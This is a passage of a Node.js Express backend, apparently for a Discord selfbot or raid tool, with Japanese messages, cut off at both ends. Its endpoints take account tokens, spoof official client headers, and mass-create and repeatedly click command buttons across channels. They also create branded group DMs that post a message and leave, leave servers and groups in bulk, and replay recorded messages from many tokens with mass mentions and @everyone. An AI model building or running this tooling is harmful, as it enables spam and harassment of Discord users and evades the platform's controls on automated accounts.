                            channelId, 
                            messageId, 
                            customId: actualCustomId,
                            idsToMention: stored.idsToMention || []
                        };
                    }
                    
                    // Try to fetch messageId from webhook if interactionToken is available
                    if (stored.interactionToken && payloadReady) {
                        const msgData = await fetchMessageFromWebhook(channelId, stored.interactionToken, 2);
                        if (msgData && msgData.messageId) {
                            return {
                                success: true,
                                channelId,
                                messageId: msgData.messageId,
                                customId: msgData.customId || actualCustomId,
                                idsToMention: stored.idsToMention || []
                            };
                        }
                    }
                }
                
                await delay(pollInterval);
            }
            
            return { success: false, channelId, error: 'Timeout waiting for button confirmation' };
        };

        // Function to create button for a single channel with retry
        const createButtonForChannel = async (channelId, retryCount = 0) => {
            const maxRetries = 30;
            
            // Build options for this specific channel (with @everyone check)
            const channelOptions = buildOptionsForChannel(channelId);
            
            const payload = {
                type: 2,
                application_id: CLIENT_ID,
                channel_id: channelId,
                session_id: sessionId,
                nonce: generateSnowflake(),
                data: {
                    version: aheCommand.version,
                    id: aheCommand.id,
                    name: 'ahe',
                    type: 1,
                    options: channelOptions,
                    application_command: {
                        id: aheCommand.id,
                        application_id: CLIENT_ID,
                        version: aheCommand.version,
                        name: 'ahe',
                        description: 'ahe command',
                        type: 1,
                        options: aheCommand.options || [],
                        integration_types: [0, 1],
                        contexts: [0, 1, 2]
                    }
                }
            };
            if (guildId) payload.guild_id = guildId;

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

            // Debug: Log payload on first attempt
            if (retryCount === 0) {
                console.log(`[AHE-SEQUENTIAL] Payload for ${channelId}: options=${JSON.stringify(channelOptions)}, aheCmd.id=${aheCommand.id}, version=${aheCommand.version}`);
            }

            try {
                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                    timeout: 10000
                });
                return { sent: true };
            } catch (e) {
                const errorMessage = e.response?.data?.message || e.message;
                const errorCode = e.response?.data?.code;
                const errorDetails = e.response?.data?.errors ? JSON.stringify(e.response.data.errors) : '';
                const isRateLimited = e.response?.status === 429 || errorMessage.includes('rate');
                
                // Log detailed error info
                if (errorDetails) {
                    console.log(`[AHE-SEQUENTIAL] API Error details for ${channelId}: code=${errorCode}, errors=${errorDetails}`);
                }
                
                if (isRateLimited && retryCount < maxRetries) {
                    const retryAfter = (e.response?.data?.retry_after || 2) * 1000;
                    console.log(`[AHE-SEQUENTIAL] Rate limited on ${channelId}, waiting ${retryAfter}ms before retry ${retryCount + 1}/${maxRetries}`);
                    await delay(retryAfter);
                    return createButtonForChannel(channelId, retryCount + 1);
                }
                
                return { sent: false, error: errorMessage + (errorDetails ? ` (${errorDetails})` : '') };
            }
        };

        // Process each channel one by one with full retry (up to 30 times per channel)
        const MAX_CHANNEL_RETRIES = 30;
        
        for (let i = 0; i < channels.length; i++) {
            // Check for cancellation before each channel
            if (shouldCancel(operationId)) {
                console.log(`[AHE-SEQUENTIAL] Operation cancelled at channel ${i + 1}/${channels.length}`);
                endOperation(operationId);
                return res.json({
                    success: false,
                    cancelled: true,
                    message: 'Operation cancelled by user',
                    buttonsCreated: buttonData.length,
                    channelsProcessed: i
                });
            }
            
            const channelId = channels[i];
            let success = false;
            let lastError = null;
            
            let cancelledDuringRetry = false;
            for (let attempt = 1; attempt <= MAX_CHANNEL_RETRIES && !success; attempt++) {
                // Check for cancellation during retries
                if (shouldCancel(operationId)) {
                    console.log(`[AHE-SEQUENTIAL] Operation cancelled during retry for channel ${channelId}`);
                    cancelledDuringRetry = true;
                    break;
                }
                
                console.log(`[AHE-SEQUENTIAL] Channel ${i + 1}/${channels.length} (${channelId}) - Attempt ${attempt}/${MAX_CHANNEL_RETRIES}`);
                
                // Clear any previous stored data for this channel
                clearRecentButtonCreation(channelId);
                
                // Step 1: Send the command to create button
                const sendResult = await createButtonForChannel(channelId);
                
                if (!sendResult.sent) {
                    lastError = sendResult.error;
                    console.log(`[AHE-SEQUENTIAL] Command send failed: ${lastError}`);
                    
                    // Update progress with error
                    updateProgress(operationId, {
                        phase: 'creating',
                        status: `ボタン作成中 (${buttonData.length}/${channels.length}) - リトライ ${attempt}/${MAX_CHANNEL_RETRIES}`,
                        totalChannels: channels.length,
                        createdButtons: buttonData.length,
                        totalClicks: clickCount,
                        clicksSent: 0,
                        currentChannel: i + 1,
                        lastError: lastError
                    });
                    
                    if (attempt < MAX_CHANNEL_RETRIES) {
                        await delay(1000);
                    }
                    continue;
                }
                
                console.log(`[AHE-SEQUENTIAL] Command sent, waiting for button confirmation...`);
                
                // Step 2: Wait for button to be confirmed created
                const result = await waitForButtonConfirmation(channelId);
                
                // Check if cancelled during confirmation wait
                if (result.error === 'Cancelled by user') {
                    cancelledDuringRetry = true;
                    break;
                }
                
                if (result.success) {
                    buttonData.push({
                        channelId: result.channelId,
                        messageId: result.messageId,
                        customId: result.customId,
                        idsToMention: result.idsToMention
                    });
                    aheButtonStorage.set(channelId, { messageId: result.messageId, customId: result.customId });
                    console.log(`[AHE-SEQUENTIAL] OK! Button confirmed (${buttonData.length}/${channels.length})`);
                    
                    // Update progress
                    updateProgress(operationId, {
                        phase: 'creating',
                        status: `ボタン作成中 (${buttonData.length}/${channels.length})`,
                        totalChannels: channels.length,
                        createdButtons: buttonData.length,
                        totalClicks: clickCount,
                        clicksSent: 0,
                        currentChannel: i + 1
                    });
                    success = true;
                } else {
                    lastError = result.error || 'Confirmation timeout';
                    console.log(`[AHE-SEQUENTIAL] Confirmation failed: ${lastError}`);
                    
                    if (attempt < MAX_CHANNEL_RETRIES) {
                        await delay(1000);
                    }
                }
            }
            
            // If cancelled during retry, immediately return
            if (cancelledDuringRetry) {
                console.log(`[AHE-SEQUENTIAL] Returning early due to cancellation`);
                endOperation(operationId);
                return res.json({
                    success: false,
                    cancelled: true,
                    message: 'Operation cancelled by user',
                    buttonsCreated: buttonData.length,
                    channelsProcessed: i
                });
            }
            
            if (!success) {
                console.log(`[AHE-SEQUENTIAL] FAILED after ${MAX_CHANNEL_RETRIES} attempts: ${channelId}`);
                failedChannels.push({ channelId, error: lastError });
            }
            
            // Small delay between channels
            if (i < channels.length - 1) {
                await delay(300);
            }
        }

        console.log(`[AHE-SEQUENTIAL] Phase 1 complete: ${buttonData.length}/${channels.length} buttons confirmed`);
        
        // Don't proceed to clicking if not all buttons were created
        if (buttonData.length === 0) {
            return res.json({
                success: false,
                error: 'No buttons were created successfully',
                channelCount: channels.length,
                buttonsCreated: 0,
                buttonsFailed: failedChannels.length,
                skippedChannels,
                failedChannels: failedChannels.map(f => f.channelId)
            });
        }
        
        if (buttonData.length < channels.length) {
            console.log(`[AHE-SEQUENTIAL] WARNING: Only ${buttonData.length}/${channels.length} buttons created, proceeding with available buttons`);
        }
        
        // Extra wait for Discord to fully process before clicking
        await delay(1500);

        // Phase 2: Click buttons - cycle through all channels, interleaved
        // clicksPerChannel = how many times each channel is clicked per "super round"
        // Example: 4 channels, clickCount=10, clicksPerChannel=2
        //   -> Sub-round 1: ch1, ch2, ch3, ch4 (4 clicks)
        //   -> Sub-round 2: ch1, ch2, ch3, ch4 (8 clicks) - completes 1 "super round" (each ch clicked 2x)
        //   -> Sub-round 3: ch1, ch2 (10 clicks - stop)
        const totalClicks = clickCount;
        const channelCount = buttonData.length;
        
        console.log(`[AHE-SEQUENTIAL] Phase 2: Total ${totalClicks} clicks, ${channelCount} channels, ${clicksPerChannel} clicks/channel/super-round`);
        
        // Update progress - clicking phase
        updateProgress(operationId, {
            phase: 'clicking',
            status: `クリック開始 (0/${totalClicks})`,
            totalChannels: channels.length,
            createdButtons: buttonData.length,
            totalClicks: totalClicks,
            clicksSent: 0,
            currentChannel: 0
        });
        
        let clicksSent = 0;
        let subRound = 1;
        let superRound = 1;
        let clicksInSuperRound = 0;
        let cancelled = false;
        
        while (clicksSent < totalClicks && !cancelled) {
            // Check for cancellation at the start of each round
            if (shouldCancel(operationId)) {
                console.log(`[AHE-SEQUENTIAL] Operation cancelled during clicking phase at ${clicksSent}/${totalClicks} clicks`);
                cancelled = true;
                break;
            }
            
            console.log(`[AHE-SEQUENTIAL] Super-Round ${superRound}, Sub-Round ${subRound} (${clicksInSuperRound}/${clicksPerChannel} per channel)`);
            
            // Go through all channels once
            for (let channelIndex = 0; channelIndex < channelCount && clicksSent < totalClicks && !shouldCancel(operationId); channelIndex++) {
                const data = buttonData[channelIndex];
                
                const clickPayload = {
                    type: 3,
                    nonce: generateSnowflake(),
                    session_id: sessionId,
                    channel_id: data.channelId,
                    message_id: data.messageId,
                    message_flags: 64,
                    application_id: CLIENT_ID,
                    data: { component_type: 2, custom_id: data.customId }
                };
                if (guildId) clickPayload.guild_id = guildId;

                const boundary = '----WebKitFormBoundary' + generateBoundary();
                const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

                let clickSuccess = false;
                let retryCount = 0;
                const maxRetries = 5;
                
                while (!clickSuccess && retryCount < maxRetries) {
                    // Check for cancellation inside retry loop
                    if (shouldCancel(operationId)) {
                        cancelled = true;
                        console.log(`[AHE-SEQUENTIAL] Cancelled inside click retry loop`);
                        break;
                    }
                    
                    try {
                        await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                            headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
                            timeout: 10000
                        });
                        clicksSent++;
                        clickSuccess = true;
                        console.log(`[AHE-SEQUENTIAL] SR${superRound}-${subRound} Ch${channelIndex + 1} - Total ${clicksSent}/${totalClicks}`);
                        
                        // Update progress on each click
                        updateProgress(operationId, {
                            phase: 'clicking',
                            status: `クリック中 (${clicksSent}/${totalClicks})`,
                            totalChannels: channels.length,
                            createdButtons: buttonData.length,
                            totalClicks: totalClicks,
                            clicksSent: clicksSent,
                            currentChannel: channelIndex + 1
                        });
                    } catch (e) {
                        const errorMessage = e.response?.data?.message || e.message;
                        console.log(`[AHE-SEQUENTIAL] Click failed for Ch${channelIndex + 1}: ${errorMessage}`);
                        
                        if (e.response?.status === 429) {
                            const retryAfter = ((e.response?.data?.retry_after || 2) * 1000) + 500;
                            console.log(`[AHE-SEQUENTIAL] Rate limited, waiting ${retryAfter}ms then retry...`);
                            // Check cancellation before waiting
                            if (shouldCancel(operationId)) {
                                cancelled = true;
                                console.log(`[AHE-SEQUENTIAL] Cancelled during rate limit wait`);
                                break;
                            }
                            await delay(retryAfter);
                            retryCount++;
                        } else {
                            break;
                        }
                    }
                }
                
                // Break out if cancelled
                if (cancelled) break;
            }
            
            subRound++;
            clicksInSuperRound++;
            
            // Check if we've completed a super round
            if (clicksInSuperRound >= clicksPerChannel) {
                superRound++;
                subRound = 1;
                clicksInSuperRound = 0;
            }
            
            // Delay between sub-rounds to avoid rate limiting
            if (clicksSent < totalClicks) {
                await delay(100);
            }
        }

        console.log(`[AHE-SEQUENTIAL] Phase 2 complete: Fired ${clicksSent}/${totalClicks} clicks${cancelled ? ' (cancelled)' : ''}`);

        endOperation(operationId);
        
        res.json({
            success: !cancelled,
            cancelled: cancelled,
            operationId: operationId,
            channelCount: channels.length,
            buttonsCreated: buttonData.length,
            buttonsFailed: failedChannels.length,
            totalClicks: totalClicks,
            clicksPerChannel: clicksPerChannel,
            clicksSent: clicksSent,
            superRounds: superRound - 1,
            skippedChannels,
            failedChannels: failedChannels.map(f => f.channelId)
        });

    } catch (error) {
        endOperation(operationId);
        console.error('[AHE-SEQUENTIAL] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/ahe-click-stored-buttons', async (req, res) => {
    try {
        const { token, channelIds, guildId } = req.body;

        if (!token || !channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'token and channelIds are required' });
        }

        const channels = Array.isArray(channelIds) ? channelIds : [channelIds];

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const sessionId = generateSessionId();
        
        console.log(`[AHE-CLICK-STORED] Looking for stored buttons in ${channels.length} channels`);

        const buttonData = [];
        for (const channelId of channels) {
            const stored = aheButtonStorage.get(channelId) || getRecentButtonCreation(channelId);
            if (stored && stored.customId) {
                buttonData.push({ channelId, messageId: stored.messageId, customId: stored.customId });
            } else if (stored && stored.buttonCustomId) {
                let messageId = stored.messageId;
                
                if (!messageId || messageId.startsWith('pending_')) {
                    if (stored.interactionToken) {
                        try {
                            const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${stored.interactionToken}/messages/@original`;
                            const response = await axios.get(webhookUrl);
                            messageId = response.data?.id;
                        } catch (e) {}
                    }
                }
                
                if (messageId && !messageId.startsWith('pending_')) {
                    buttonData.push({ channelId, messageId, customId: stored.buttonCustomId });
                }
            }
        }

        console.log(`[AHE-CLICK-STORED] Found ${buttonData.length} stored buttons`);

        if (buttonData.length === 0) {
            return res.json({
                success: false,
                error: 'No stored buttons found. Create buttons first.',
                buttonsFound: 0,
                clicksSent: 0
            });
        }

        let clicksSent = 0;
        
        for (const data of buttonData) {
            const clickPayload = {
                type: 3,
                nonce: generateSnowflake(),
                session_id: sessionId,
                channel_id: data.channelId,
                message_id: data.messageId,
                message_flags: 64,
                application_id: CLIENT_ID,
                data: { component_type: 2, custom_id: data.customId }
            };
            if (guildId) clickPayload.guild_id = guildId;

            const boundary = '----WebKitFormBoundary' + generateBoundary();
            const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

            axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` }
            }).then(() => {
                console.log(`[AHE-CLICK-STORED] Click sent to ${data.channelId}`);
            }).catch(e => {
                console.log(`[AHE-CLICK-STORED] Click failed for ${data.channelId}: ${e.response?.data?.message || e.message}`);
            });
            
            clicksSent++;
        }

        console.log(`[AHE-CLICK-STORED] Fired ${clicksSent} clicks`);

        res.json({
            success: true,
            buttonsFound: buttonData.length,
            clicksSent: clicksSent,
            channelIds: buttonData.map(b => b.channelId)
        });

    } catch (error) {
        console.error('[AHE-CLICK-STORED] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/ahe-click-single-channel', async (req, res) => {
    try {
        const { token, channelId, guildId } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'token and channelId are required' });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const superProperties = {
            os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
            client_build_number: 251236
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const sessionId = generateSessionId();
        
        const stored = aheButtonStorage.get(channelId) || getRecentButtonCreation(channelId);
        
        if (!stored) {
            return res.json({
                success: false,
                error: 'No stored button found for this channel',
                channelId
            });
        }

        let messageId = stored.messageId;
        let customId = stored.customId || stored.buttonCustomId;

        if (!messageId || messageId.startsWith('pending_')) {
            if (stored.interactionToken) {
                try {
                    const webhookUrl = `${DISCORD_API_BASE}/webhooks/${CLIENT_ID}/${stored.interactionToken}/messages/@original`;
                    const response = await axios.get(webhookUrl);
                    messageId = response.data?.id;
                } catch (e) {
                    console.log(`[AHE-SINGLE-CLICK] Failed to fetch messageId for ${channelId}`);
                }
            }
        }

        if (!messageId || messageId.startsWith('pending_') || !customId) {
            return res.json({
                success: false,
                error: 'Button data incomplete',
                channelId
            });
        }

        const clickPayload = {
            type: 3,
            nonce: generateSnowflake(),
            session_id: sessionId,
            channel_id: channelId,
            message_id: messageId,
            message_flags: 64,
            application_id: CLIENT_ID,
            data: { component_type: 2, custom_id: customId }
        };
        if (guildId) clickPayload.guild_id = guildId;

        const boundary = '----WebKitFormBoundary' + generateBoundary();
        const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

        axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
            headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
            timeout: 5000
        }).then(() => {
            console.log(`[AHE-SINGLE-CLICK] Click sent to ${channelId}`);
        }).catch(e => {
            console.log(`[AHE-SINGLE-CLICK] Click failed for ${channelId}: ${e.response?.data?.message || e.message}`);
        });
        
        res.json({
            success: true,
            channelId,
            messageId,
            customId
        });

    } catch (error) {
        console.error('[AHE-SINGLE-CLICK] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/ping', (req, res) => {
    res.status(200).send('OK');
});

app.post('/api/create-group-dm', async (req, res) => {
    try {
        let { token, recipientIds, groupName, groupIcon, sendMessage, message, autoLeave } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!recipientIds || !Array.isArray(recipientIds)) {
            return res.status(400).json({ error: 'フレンドIDを配列で指定してください' });
        }

        const validIds = recipientIds
            .map(id => String(id).trim())
            .filter(id => /^\d{17,19}$/.test(id));
        
        const uniqueIds = [...new Set(validIds)];
        
        if (uniqueIds.length < 2) {
            return res.status(400).json({ error: 'フレンドIDを2人以上指定してください（重複除く）' });
        }

        const headers = getDiscordHeaders(token);

        const payload = {
            recipients: uniqueIds
        };

        const response = await axios.post(`${DISCORD_API_BASE}/users/@me/channels`, payload, { headers });

        const channelId = response.data.id;

        let trimmedName = groupName ? String(groupName).trim() : null;
        const trimmedIcon = groupIcon ? String(groupIcon).trim() : null;

        // Always append " by Anko" to group name (use "by Anko" if name is empty)
        if (trimmedName) {
            trimmedName = trimmedName + ' by Anko';
        } else {
            trimmedName = 'by Anko';
        }

        if (trimmedName || trimmedIcon) {
            const updatePayload = {};
            if (trimmedName) updatePayload.name = trimmedName;
            if (trimmedIcon) {
                try {
                    const iconResponse = await axios.get(trimmedIcon, { responseType: 'arraybuffer', timeout: 10000 });
                    const contentType = iconResponse.headers['content-type'];
                    if (contentType && contentType.startsWith('image/')) {
                        const base64 = Buffer.from(iconResponse.data).toString('base64');
                        updatePayload.icon = `data:${contentType};base64,${base64}`;
                    }
                } catch (iconError) {
                    console.log('Failed to fetch group icon:', iconError.message);
                }
            }

            if (Object.keys(updatePayload).length > 0) {
                try {
                    await axios.patch(`${DISCORD_API_BASE}/channels/${channelId}`, updatePayload, { headers });
                } catch (patchError) {
                    console.log('Failed to update group DM:', patchError.response?.data?.message || patchError.message);
                }
            }
        }

        let messageSent = false;
        let leftGroup = false;

        if (sendMessage && message) {
            const trimmedMessage = String(message).trim();
            if (trimmedMessage) {
                try {
                    await axios.post(`${DISCORD_API_BASE}/channels/${channelId}/messages`, {
                        content: trimmedMessage
                    }, { headers });
                    messageSent = true;
                } catch (msgError) {
                    console.log('Failed to send message:', msgError.response?.data?.message || msgError.message);
                }
            }
        }

        if (autoLeave) {
            try {
                await axios.delete(`${DISCORD_API_BASE}/channels/${channelId}`, { headers });
                leftGroup = true;
            } catch (leaveError) {
                console.log('Failed to leave group:', leaveError.response?.data?.message || leaveError.message);
            }
        }

        res.json({
            success: true,
            channelId: channelId,
            groupName: trimmedName || 'デフォルト',
            memberCount: uniqueIds.length + 1,
            messageSent: messageSent,
            leftGroup: leftGroup
        });

    } catch (error) {
        console.error('Error creating group DM:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'トークンが無効です' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: '権限がないか、フレンドではないユーザーが含まれています' });
        } else if (error.response?.status === 400) {
            res.status(400).json({ error: 'リクエストが無効です' });
        } else {
            res.status(500).json({ error: 'グループDMの作成に失敗しました' });
        }
    }
});

app.post('/api/leave-guild', async (req, res) => {
    try {
        let { token, guildId } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!guildId || !/^\d{17,19}$/.test(guildId)) {
            return res.status(400).json({ error: '有効なサーバーIDを入力してください' });
        }

        const headers = getDiscordHeaders(token);
        delete headers['Content-Type'];

        await axios.delete(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}`, { headers });

        res.json({
            success: true,
            guildId: guildId,
            message: 'サーバーから退出しました'
        });

    } catch (error) {
        console.error('Error leaving guild:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ success: false, error: 'トークンが無効です' });
        } else if (error.response?.status === 404) {
            res.status(404).json({ success: false, error: 'サーバーが見つからないか、既に退出しています' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ success: false, error: 'サーバーのオーナーは退出できません' });
        } else {
            res.status(500).json({ success: false, error: 'サーバー退出に失敗しました' });
        }
    }
});

app.post('/api/update-nickname', async (req, res) => {
    try {
        let { token, guildId, nickname } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!guildId || !/^\d{17,19}$/.test(guildId)) {
            return res.status(400).json({ error: '有効なサーバーIDを入力してください' });
        }

        const headers = getDiscordHeaders(token);
        
        const payload = {
            nick: nickname !== undefined ? (nickname.trim() || null) : null
        };

        const response = await axios.patch(`${DISCORD_API_BASE}/guilds/${guildId}/members/@me`, payload, { headers });

        res.json({
            success: true,
            nickname: response.data.nick || null,
            message: 'ニックネームを変更しました'
        });

    } catch (error) {
        console.error('Error updating nickname:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ success: false, error: 'トークンが無効です' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ success: false, error: 'ニックネームを変更する権限がありません' });
        } else if (error.response?.status === 404) {
            res.status(404).json({ success: false, error: 'サーバーが見つかりません' });
        } else if (error.response?.status === 400) {
            res.status(400).json({ success: false, error: error.response?.data?.message || 'ニックネームが無効です' });
        } else {
            res.status(500).json({ success: false, error: 'ニックネームの変更に失敗しました' });
        }
    }
});

app.post('/api/leave-all-group-dms', async (req, res) => {
    try {
        let { token } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        const headers = getDiscordHeaders(token);

        const channelsResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/channels`, { headers });
        const allChannels = channelsResponse.data;
        
        const groupDms = allChannels.filter(ch => ch.type === 3);
        
        if (groupDms.length === 0) {
            return res.json({
                success: true,
                leftCount: 0,
                totalGroups: 0,
                message: '参加しているグループDMはありません'
            });
        }

        let leftCount = 0;
        let errors = [];

        for (const group of groupDms) {
            try {
                await axios.delete(`${DISCORD_API_BASE}/channels/${group.id}`, { headers });
                leftCount++;
                await delay(300);
            } catch (leaveError) {
                console.log(`Failed to leave group ${group.id}:`, leaveError.response?.data?.message || leaveError.message);
                errors.push({
                    channelId: group.id,
                    name: group.name || 'グループDM',
                    error: leaveError.response?.data?.message || leaveError.message
                });
            }
        }

        res.json({
            success: true,
            leftCount,
            totalGroups: groupDms.length,
            errors: errors.length > 0 ? errors : undefined,
            message: `${leftCount}/${groupDms.length} のグループDMから退出しました`
        });

    } catch (error) {
        console.error('Error leaving all group DMs:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ success: false, error: 'トークンが無効です' });
        } else {
            res.status(500).json({ success: false, error: 'グループDMからの退出に失敗しました' });
        }
    }
});

app.post('/api/create-dm-channel', async (req, res) => {
    try {
        let { token, userId } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!userId || !/^\d{17,19}$/.test(userId)) {
            return res.status(400).json({ error: '有効なユーザーIDを入力してください' });
        }

        const headers = getDiscordHeaders(token);

        const response = await axios.post(`${DISCORD_API_BASE}/users/@me/channels`, {
            recipient_id: userId
        }, { headers });

        res.json({
            success: true,
            channelId: response.data.id,
            userId: userId
        });

    } catch (error) {
        console.error('Error creating DM channel:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'トークンが無効です' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'このユーザーにDMを送れません' });
        } else if (error.response?.status === 400) {
            res.status(400).json({ error: 'ユーザーIDが無効です' });
        } else {
            res.status(500).json({ error: 'DMチャンネルの作成に失敗しました' });
        }
    }
});

// メッセージ記録API - チャンネルからメッセージを取得して記録（ファイル永続化）
app.post('/api/record-messages', async (req, res) => {
    try {
        const { token, channelIds, messageCount } = req.body;

        if (!token || typeof token !== 'string' || !token.trim()) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'チャンネルIDが必要です' });
        }

        const count = Math.min(Math.max(parseInt(messageCount) || 10, 1), 100);
        const headers = getDiscordHeaders(token.trim());
        
        let allMessages = [];
        const channelResults = {};

        for (const channelId of channelIds) {
            try {
                const response = await axios.get(
                    `${DISCORD_API_BASE}/channels/${channelId}/messages?limit=${count}`,
                    { headers, timeout: 15000 }
                );
                
                const messages = response.data.map(msg => ({
                    id: msg.id,
                    content: msg.content,
                    author: msg.author?.username || 'Unknown',
                    authorId: msg.author?.id,
                    timestamp: msg.timestamp,
                    channelId: channelId
                })).filter(msg => msg.content && msg.content.trim());
                
                allMessages.push(...messages);
                channelResults[channelId] = { success: true, count: messages.length };
                
                await delay(200);
            } catch (err) {
                console.log(`[record-messages] Failed to fetch from ${channelId}: ${err.message}`);
                channelResults[channelId] = { success: false, error: err.response?.data?.message || err.message };
            }
        }

        // 古い順にソート（timestampで）
        allMessages.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));

        // ファイルストレージに保存（1時間後に自動削除）
        const storageKey = `rec_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        await saveRecordedMessages(storageKey, {
            messages: allMessages
        });

        res.json({
            success: true,
            storageKey,
            totalMessages: allMessages.length,
            channelResults,
            preview: allMessages.slice(0, 5).map(m => ({ content: m.content.substring(0, 50), author: m.author }))
        });

    } catch (error) {
        console.error('Error recording messages:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ error: 'トークンが無効です' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ error: 'チャンネルにアクセスできません' });
        } else {
            res.status(500).json({ error: 'メッセージの記録に失敗しました' });
        }
    }
});

// メッセージ再送信API - 記録したメッセージを順番に送信（非同期バックグラウンド処理）
app.post('/api/replay-messages', async (req, res) => {
    const operationId = startOperation('replay-messages');
    
    try {
        const { 
            tokens, 
            storageKey, 
            targetChannelIds, 
            delayMs, 
            appendMessage, 
            userIds, 
            mentionCount, 
            includeEveryone, 
            includeRandomChars 
        } = req.body;

        if (!tokens || tokens.length === 0) {
            endOperation(operationId);
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!storageKey) {
            endOperation(operationId);
            return res.status(400).json({ error: '記録キーが必要です' });
        }

        if (!targetChannelIds || targetChannelIds.length === 0) {
            endOperation(operationId);
            return res.status(400).json({ error: '送信先チャンネルIDが必要です' });
        }

        const storedData = await getRecordedMessages(storageKey);
        if (!storedData || !storedData.messages || storedData.messages.length === 0) {
            endOperation(operationId);
